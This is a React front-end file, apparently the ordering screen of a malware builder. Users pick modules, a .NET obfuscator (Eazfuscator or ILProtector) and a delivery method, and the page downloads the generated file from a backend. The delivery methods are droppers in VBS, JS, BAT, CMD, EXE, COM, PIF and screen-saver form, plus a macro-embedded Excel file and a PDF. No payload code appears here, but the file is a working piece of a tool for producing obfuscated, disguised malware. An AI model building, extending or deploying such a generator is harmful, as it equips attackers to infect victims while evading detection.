import React, { useState, useEffect } from "react";
import Steps from "../components/Steps";
import { useCartContext } from "../context/cartContext";
import {
  Row,
  Col,
  Container,
  Form,
  ListGroup,
  Alert,
  Button,
} from "react-bootstrap";
import axios from "axios";
import Loading from "../components/Loading";
function GeneratorScreen({ history }) {
  const { cart, clearCart } = useCartContext();
  const [error, setError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [obfuscator, setObfuscator] = useState("");
  const [method, setMethod] = useState("");
  const [modules, setModules] = useState([]);
  const [loading, setLoading] = useState(false);
  const obfuscators = [
    {
      name: "Eazfuscator",
      code: "Eazfuscator/Eazfuscator.NET.exe",
    },
    {
      name: "ILProtector",
      code: "ILProtector/ILProtector.exe",
    },
  ];
  const methods = [
    { name: "vba embedded excel file", code: "vba" },
    { name: "visual basic script", code: "dropper vbs" },
    { name: "javascript file", code: "dropper js" },
    { name: "bat file", code: "dropper bat" },
    { name: "cmd file", code: "dropper cmd" },
    { name: "executable exe file", code: "dropper exe" },
    { name: "executable COM file", code: "dropper com" },
    { name: "executable pif file", code: "dropper pif" },
    { name: "executable Screen saver", code: "dropper scr" },
    { name: "pdf file", code: "pdf" },
  ];
  useEffect(() => {}, [error, loading]);

  const submitHandler = async (e) => {
    e.preventDefault();
    cart.sort(function (a, b) {
      return a.order < b.order ? -1 : a.order > b.order ? 1 : 0;
    });
    const modules = [];
    let dotnetVersion = ["dotnet5", "dotnet48"];
    cart.forEach(myFunction);

    function myFunction(item) {
      const j = { id: item.id };
      modules.push(j);
      if (item.dotnetVersions.length < 2) {
        const version = item.dotnetVersions[0].dotnetVersion;
        if (!dotnetVersion.includes(version)) {
          setError("There are incompatible dotnet version in modules");
          return;
        } else {
          dotnetVersion = [version];
          console.log(dotnetVersion);
        }
      }
    }
    const dotnet = dotnetVersion[0];
    const json = { modules: modules, obfuscator: obfuscator, method: method };
    console.log(json);
    setLoading(true);
    try {
      const response = await axios.post("api/generate/" + dotnet, json, {
        responseType: "arraybuffer",
        headers: {
          "Content-Type": "application/json",
        },
      });
      const type = response.headers["content-type"];
      const blob = new Blob([response.data], {
        type: type,
        encoding: "UTF-8",
      });
      const link = document.createElement("a");
      link.href = window.URL.createObjectURL(blob);
      link.download = response.headers["content-disposition"]
        .split("filename=")[1]
        .split(";")[0]
        .slice(1, -1);
      link.click();
      setError(false);
      clearCart();
      setLoading(false);
      history.push("/");
    } catch (error) {
      setError(true);
      setErrorMessage(error.message);
      setLoading(false);
    }
  };
  return (
    <div>
      <Steps />
      {loading ? (
        <Loading />
      ) : (
        <Container>
          {error && <Alert variant="danger">{errorMessage}</Alert>}
          <Row>
            <Col>
              <h3> OBFUSCATORS</h3>
              <ListGroup as="ol" numbered>
                {obfuscators.map((obf) =>
                  obf.code === obfuscator ? (
                    <ListGroup.Item
                      variant="primary"
                      action
                      onClick={(e) => setObfuscator("")}
                    >
                      <Row>{obf.name}</Row>
                    </ListGroup.Item>
                  ) : (
                    <ListGroup.Item
                      action
                      onClick={(e) => setObfuscator(obf.code)}
                    >
                      <Row>{obf.name}</Row>
                    </ListGroup.Item>
                  )
                )}
              </ListGroup>
            </Col>
            <Col>
              <h3> METHODS</h3>
              <ListGroup as="ol" numbered>
                {methods.map((m) =>
                  m.code === method ? (
                    <ListGroup.Item
                      variant="primary"
                      action
                      onClick={(e) => setMethod("")}
                    >
                      <Row>{m.name}</Row>
                    </ListGroup.Item>
                  ) : (
                    <ListGroup.Item action onClick={(e) => setMethod(m.code)}>
                      <Row>{m.name}</Row>
                    </ListGroup.Item>
                  )
                )}
              </ListGroup>
            </Col>
          </Row>
          <Button onClick={submitHandler}>Generate</Button>
        </Container>
      )}
    </div>
  );
}

export default GeneratorScreen;
